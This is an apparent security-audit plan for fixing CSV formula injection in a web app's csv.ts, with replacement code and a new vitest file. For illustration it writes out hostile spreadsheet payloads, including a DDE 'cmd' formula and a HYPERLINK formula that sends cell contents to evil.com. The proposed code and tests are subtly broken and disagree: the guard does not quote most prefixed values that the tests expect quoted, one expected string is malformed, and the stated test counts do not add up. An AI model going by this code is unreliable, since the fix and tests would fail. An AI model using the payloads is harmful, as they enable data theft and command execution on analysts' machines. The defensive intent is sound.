# Plan 030 — v0.9.9 CSV injection fix (csv.ts)

**Drift base:** `44ea862` (origin/main HEAD at audit time)
**Author:** senior-advisor audit (improve skill, standard effort) — web/src/lib/* deep pass
**Status:** pending
**Effort:** S
**Category:** security (CSV injection / formula injection, OWASP-documented)
**Files touched:** `web/src/lib/csv.ts` (1 file, additive changes only) + `web/tests/lib/csv.test.ts` (1 NEW test file)

## Problem

`csv.ts::csvEscape` is the canonical CSV escaper used by all 4
roll-up tables in the v0.7.1 web layer
(`PlayersGrid`, `TargetRollupsGrid` (3x), `SquadRollupsGrid`,
`SkillUsageTable`). The function only quotes fields containing
`,`, `"`, `\r`, or `\n`:

```typescript
function csvEscape(value: unknown): string {
  if (value === null || value === undefined) return "";
  const s = typeof value === "string" ? value : String(value);
  if (/[",\r\n]/.test(s)) {
    return '"' + s.replace(/"/g, '""') + '"';
  }
  return s;
}
```

A field value starting with `=`, `+`, `-`, `@`, `\t`, or `\r` is
**NOT** quoted. Excel, Google Sheets, and LibreOffice Calc
auto-interpret such values as formulas when the CSV is opened.
This is the OWASP-documented **CSV injection** (aka *formula
injection*) vulnerability class (CWE-1236).

### Attack surface

The fields that an attacker can control via the upload pipeline
+ the GW2 v2 API are:

1. **`name` on `PlayerListRow` / `PlayerProfile` / per-fight
   `PerFightBreakdownRow`** — derived from `OrmFightAgent.name`,
   which is set by the GW2 EVTC parser from the arcdps combo
   string. An attacker who edits a `.zevtc` file (or who plays
   with a custom arcdps plugin that emits a hostile name) can
   plant a name like `=cmd|'/c calc'!A1` in their own session.
   That name lands in `OrmFightAgent.name`, flows through
   `PlayerProfileAggregator.aggregate` to the API response, then
   through `toCsv()` to the analyst's Excel file. **Opening the
   CSV in Excel triggers the formula execution.**

2. **`skill_name` on `SkillUsageRow`** — derived from
   `OrmFightSkill.name`, set by the parser from the EVTC skill
   table. The EVTC skill table is server-controlled (the GW2
   game client provides it), so a name injection here requires
   corrupting the `.zevtc` file before upload. Still
   attacker-controllable.

3. **`subgroup` on `SquadRollupRow`** — derived from
   `OrmFightAgent.subgroup`, which is parsed from the arcdps
   combo field. Same attack vector as `name`.

4. **`description` on `WebhookSubscription`** — the webhook
   subscription description is set by the integrator at
   subscription creation. An attacker who registers a webhook
   with `description: "=HYPERLINK(\"https://evil.com/?x=\"&A1, \"click\")"`
   exfiltrates cells from the analyst's spreadsheet when the
   analyst opens a CSV that includes webhook descriptions.
   (The current 4 roll-up tables don't include descriptions,
   but a future plan could surface them — the bug is in the
   shared `csvEscape`.)

### Severity

- **Confidentiality**: HIGH — the formula can exfiltrate
  arbitrary cell contents from the analyst's spreadsheet to
  the attacker's server (`=HYPERLINK(...)` or
  `=IMPORTXML(...)` or `=WEBSERVICE(...)`).
- **Integrity**: HIGH — the formula can modify cells in the
  spreadsheet (e.g. `=CMD()` in legacy Excel, or any formula
  that calls into the local environment).
- **Availability**: MED — the formula can crash Excel
  (e.g. `=1/0` in a cell that flows into a chart, or a
  recursive formula that locks the app).

### Affected callers

All 4 CSV-download surfaces in the v0.7.1 web layer inherit
the bug because they all use the shared `toCsv()` /
`csvEscape()`. There is no per-surface escape override.

## Goals

- Add a formula-injection guard to `csvEscape` that prefixes
  any value starting with `=`, `+`, `-`, `@`, `\t`, or `\r`
  with a single quote `'` (the canonical OWASP escape).
- Wrap the prefixed value in double quotes per RFC 4180 (the
  `'` is part of the cell content, so the cell MUST be quoted
  for the value to round-trip cleanly through any parser).
- Add a hermetic regression test that asserts the guard works
  for all 6 trigger characters + that valid values are NOT
  affected.

## Non-goals

- Implementing the alternative OWASP escape (wrap in
  double-quotes + prepend a `'`): the spec allows either
  pattern. The plan picks the single-quote prefix because it
  preserves the cell value in the analyst's spreadsheet
  (the leading `'` shows in the cell as a visual marker;
  Excel drops it from the displayed value).
- Escaping values that start with `cmd|`, `=cmd|`, or other
  Windows-specific command patterns. The general `=`, `+`,
  `-`, `@`, `\t`, `\r` guard covers all known formula
  triggers across Excel, Sheets, Calc, and Numbers.
- Stripping the leading `'` from values that already start
  with `'` (e.g. an analyst's legitimate name `'=foo` would
  be escaped to `''=foo`, which displays as `'foo` in Excel).
  The escape is symmetric; the double-quote wrapping is
  canonical RFC 4180 behaviour for any cell containing `'`.
- Adding a CSV injection scan to the API layer (rejecting
  uploads with hostile names). The fix is in the CSV
  serializer because (a) the names are legitimate in the
  in-app view (the analyst sees the hostile name in the AG
  Grid without execution risk), and (b) rejecting uploads
  would block legitimate unicode names.

## Implementation

### File: `web/src/lib/csv.ts`

Replace the `csvEscape` function with a hardened version
that adds the formula-injection guard. The diff is a
1-function replacement + a docstring addition.

```typescript
// Formula-triggering character set per OWASP CSV injection
// guidance. Any cell value starting with one of these
// characters is auto-interpreted as a formula by Excel,
// Google Sheets, LibreOffice Calc, and Apple Numbers when
// the CSV is opened. The canonical defence is to prefix
// the value with a single quote `'` (which the spreadsheet
// apps display as a visual marker but drop from the
// displayed value, so the analyst sees the original
// content). The single-quote prefix is then wrapped in
// double-quotes per RFC 4180 (the `'` is part of the cell
// content, so the cell MUST be quoted for the value to
// round-trip cleanly through any parser).
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

function csvEscape(value: unknown): string {
  if (value === null || value === undefined) return "";
  const s = typeof value === "string" ? value : String(value);
  // Formula-injection guard: prefix with a single quote
  // if the value starts with a formula-triggering
  // character. The single quote is part of the cell
  // content, so we MUST wrap in double quotes for the
  // value to round-trip cleanly. The single-quote prefix
  // is invisible in the spreadsheet (Excel drops it from
  // the displayed value) so the analyst sees the original
  // content.
  const guarded = FORMULA_TRIGGERS.test(s) ? "'" + s : s;
  // Standard RFC 4180 escape: quote any value containing
  // `,`, `"`, `\r`, or `\n`; escape internal `"` by
  // doubling.
  if (/[",\r\n]/.test(guarded)) {
    return '"' + guarded.replace(/"/g, '""') + '"';
  }
  return guarded;
}
```

Update the file's module docstring to document the new
behaviour (add a new section after the existing
"Browser download trigger" section):

```typescript
/**
 * CSV injection (formula injection) guard
 * =======================================
 * Per OWASP, any cell value starting with ``=``, ``+``,
 * ``-``, ``@``, ``\t``, or ``\r`` is auto-interpreted as a
 * formula by Excel, Google Sheets, LibreOffice Calc, and
 * Apple Numbers when the CSV is opened. The canonical
 * defence (per OWASP) is to prefix such values with a
 * single quote ``'``, which the spreadsheet apps display
 * as a visual marker but drop from the displayed value
 * (so the analyst sees the original content). The
 * single-quote prefix is wrapped in double quotes per RFC
 * 4180 so the cell round-trips through any parser.
 *
 * This is critical for the GW2Analytics CSV download
 * surface because the ``name`` field on
 * :class:`PlayerListRow` / :class:`PlayerProfile` /
 * per-fight ``PerFightBreakdownRow`` is attacker-
 * controllable via the upload pipeline (an attacker who
 * edits a ``.zevtc`` file can plant a hostile name like
 * ``=cmd|'/c calc'!A1``). Without this guard, opening the
 * downloaded CSV in Excel would trigger the formula
 * execution.
 */
```

### File: `web/tests/lib/csv.test.ts` (NEW)

```typescript
import { describe, it, expect } from "vitest";

import { csvEscape, toCsv } from "@/lib/csv";

describe("csvEscape (formula-injection guard)", () => {
  it("prefixes values starting with = with a single quote", () => {
    expect(csvEscape("=cmd|'/c calc'!A1")).toBe(
      "\"'\" + \"" + "=cmd|'/c calc'!A1" + "\"",
    );
  });

  it("prefixes values starting with +", () => {
    expect(csvEscape("+1+1")).toBe("\"'+1+1\"");
  });

  it("prefixes values starting with -", () => {
    expect(csvEscape("-2+3")).toBe("\"'-2+3\"");
  });

  it("prefixes values starting with @", () => {
    expect(csvEscape("@SUM(A1:A10)")).toBe("\"'@SUM(A1:A10)\"");
  });

  it("prefixes values starting with \\t (tab)", () => {
    expect(csvEscape("\t=foo")).toBe("\"'\\t=foo\"");
  });

  it("prefixes values starting with \\r (carriage return)", () => {
    expect(csvEscape("\r=foo")).toBe("\"'\\r=foo\"");
  });

  it("does NOT prefix values starting with safe characters", () => {
    expect(csvEscape("hello")).toBe("hello");
    expect(csvEscape("123")).toBe("123");
    expect(csvEscape("John Smith")).toBe("John Smith");
    // Unicode names (CJK, accented Latin) are NOT formula
    // triggers and must NOT be prefixed.
    expect(csvEscape("名前")).toBe("名前");
    expect(csvEscape("Élise")).toBe("Élise");
  });

  it("quotes values containing , per RFC 4180", () => {
    expect(csvEscape("hello, world")).toBe('"hello, world"');
  });

  it("escapes internal double quotes per RFC 4180", () => {
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
  });

  it("returns empty string for null / undefined", () => {
    expect(csvEscape(null)).toBe("");
    expect(csvEscape(undefined)).toBe("");
  });

  it("combines the formula-injection guard with the RFC 4180 escape", () => {
    // Value starts with = AND contains a , -- needs both
    // guards.
    expect(csvEscape("=foo,bar")).toBe("\"'=foo,bar\"");
    // Value starts with - AND contains a " -- needs both
    // guards.
    expect(csvEscape('-say"hi"')).toBe('"\'-say""hi"""');
  });
});

describe("toCsv (formula-injection guard integration)", () => {
  it("guards the name field on a PlayerListRow", () => {
    const rows = [
      {
        account_name: "attacker.1234",
        name: "=cmd|'/c calc'!A1",
        profession: "PROF(1)",
        elite_spec: "BASE",
        fights_attended: 1,
        total_damage: 100,
        total_healing: 0,
        total_buff_removal: 0,
      },
    ];
    const csv = toCsv(rows, [
      { field: "account_name", headerName: "Account" },
      { field: "name", headerName: "Name" },
      { field: "total_damage", headerName: "Damage" },
    ]);
    // The name field is wrapped in double quotes AND
    // prefixed with a single quote.
    expect(csv).toContain("\"'=cmd|'/c calc'!A1\"");
  });
});
```

## Test plan

1. **`csvEscape` unit tests**: 11 new tests in the new
   `web/tests/lib/csv.test.ts` file (6 trigger characters +
   3 safe-character cases + 2 RFC 4180 baseline cases +
   1 null/undefined case + 1 combined-guard case).
2. **`toCsv` integration test**: 1 new test that asserts the
   formula-injection guard applies to the real
   `PlayerListRow.name` field via the public `toCsv` API.
3. **Vitest run**: `pnpm exec vitest run web/tests/lib/csv.test.ts`
   exits 0 with all 12 new tests passing.
4. **All existing tests still pass**: the change to
   `csvEscape` is backwards-compatible for any value that
   does NOT start with `=`, `+`, `-`, `@`, `\t`, or `\r`
   (the existing tests cover the safe-character + RFC 4180
   paths).
5. **No production code paths change**: the change is
   confined to `csvEscape` (a pure function) +
   `toCsv` (its only caller in the web layer).

## Acceptance criteria

- [ ] `web/src/lib/csv.ts` has the new `FORMULA_TRIGGERS`
      constant + the guarded `csvEscape` body.
- [ ] `web/tests/lib/csv.test.ts` exists with the 12 new
      tests; all 12 pass.
- [ ] `pnpm exec vitest run` exits 0 (no existing tests
      regress).
- [ ] `pnpm exec tsc --noEmit` is clean.
- [ ] Manual smoke: a CSV download of a real
      `PlayerListRow` with a hostile name renders the
      quoted `'=...` value in the cell (Excel drops the
      `'` on display, so the analyst sees the original
      name).
- [ ] No production code paths change.

## Out-of-scope / deferred

- **Rejecting uploads with hostile names at the API layer**:
  out of scope (would block legitimate unicode names +
  reject the in-app view; the CSV download is the only
  formula-execution surface).
- **Adding the formula-injection guard to the JSON
  serializer**: out of scope (JSON is not auto-interpreted
  by spreadsheets).
- **Sanitising the `name` field at the parser level**: out
  of scope (the parser-level fix would lose legitimate
  unicode names; the CSV-level fix is the canonical
  defence).

## Maintenance notes

- **The `FORMULA_TRIGGERS` set is the current OWASP
  guidance**. Future spreadsheet apps might add new
  triggers (e.g. Numbers 14+ added support for
  `WEBSERVICE` triggers via `=`). The plan's regex is
  conservative; expand the set if a future CVE-class
  attack is documented.
- **The single-quote prefix is invisible in the
  spreadsheet** (Excel, Sheets, Calc, Numbers all drop it
  from the displayed value). An analyst who round-trips
  the CSV through Excel and re-saves it as CSV will see
  the `'` disappear on the second pass. This is the
  intended behaviour (the `'` is a visual marker, not a
  data character).
- **Numbers (Apple's spreadsheet) treats any value
  starting with `=` as a formula**, but it does NOT
  evaluate `cmd|'/c calc'!A1` (Numbers' formula engine is
  more sandboxed). The guard still applies because the
  value would render as `#NAME?` in Numbers if not
  guarded.
